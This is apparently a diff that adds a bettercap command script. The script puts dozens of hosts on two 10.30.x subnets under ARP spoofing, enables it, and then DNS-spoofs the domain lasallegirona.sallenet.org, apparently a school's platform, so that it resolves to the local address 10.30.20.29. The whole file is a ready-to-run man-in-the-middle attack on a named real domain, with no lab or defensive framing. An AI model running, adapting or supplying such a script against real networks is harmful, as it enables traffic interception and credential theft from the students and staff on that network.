@@ -1,0 +1,58 @@
+//
+bettercap
+
+//
+set arp.spoof targets 10.30.20.11
+set arp.spoof targets 10.30.20.12
+set arp.spoof targets 10.30.20.13
+set arp.spoof targets 10.30.20.14
+set arp.spoof targets 10.30.20.15
+set arp.spoof targets 10.30.20.17
+set arp.spoof targets 10.30.20.18
+set arp.spoof targets 10.30.20.19
+set arp.spoof targets 10.30.20.20
+set arp.spoof targets 10.30.20.21
+set arp.spoof targets 10.30.20.22
+set arp.spoof targets 10.30.20.23
+set arp.spoof targets 10.30.20.24
+set arp.spoof targets 10.30.20.25
+set arp.spoof targets 10.30.20.26
+set arp.spoof targets 10.30.20.27
+set arp.spoof targets 10.30.20.28
+set arp.spoof targets 10.30.20.30
+set arp.spoof targets 10.30.20.31
+set arp.spoof targets 10.30.20.32
+set arp.spoof targets 10.30.20.33
+set arp.spoof targets 10.30.20.35
+
+//
+set arp.spoof targets 10.30.10.11
+set arp.spoof targets 10.30.10.12
+set arp.spoof targets 10.30.10.13
+set arp.spoof targets 10.30.10.14
+set arp.spoof targets 10.30.10.15
+set arp.spoof targets 10.30.10.17
+set arp.spoof targets 10.30.10.18
+set arp.spoof targets 10.30.10.19
+set arp.spoof targets 10.30.10.20
+set arp.spoof targets 10.30.10.21
+set arp.spoof targets 10.30.10.22
+set arp.spoof targets 10.30.10.23
+set arp.spoof targets 10.30.10.24
+set arp.spoof targets 10.30.10.25
+set arp.spoof targets 10.30.10.26
+set arp.spoof targets 10.30.10.27
+set arp.spoof targets 10.30.10.28
+set arp.spoof targets 10.30.10.30
+set arp.spoof targets 10.30.10.31
+set arp.spoof targets 10.30.10.32
+set arp.spoof targets 10.30.10.33
+set arp.spoof targets 10.30.10.35
+
+//
+arp.spoof on
+
+//
+set dns.spoof.domains lasallegirona.sallenet.org
+set dns.spoof.address 10.30.20.29
+dns.spoof on
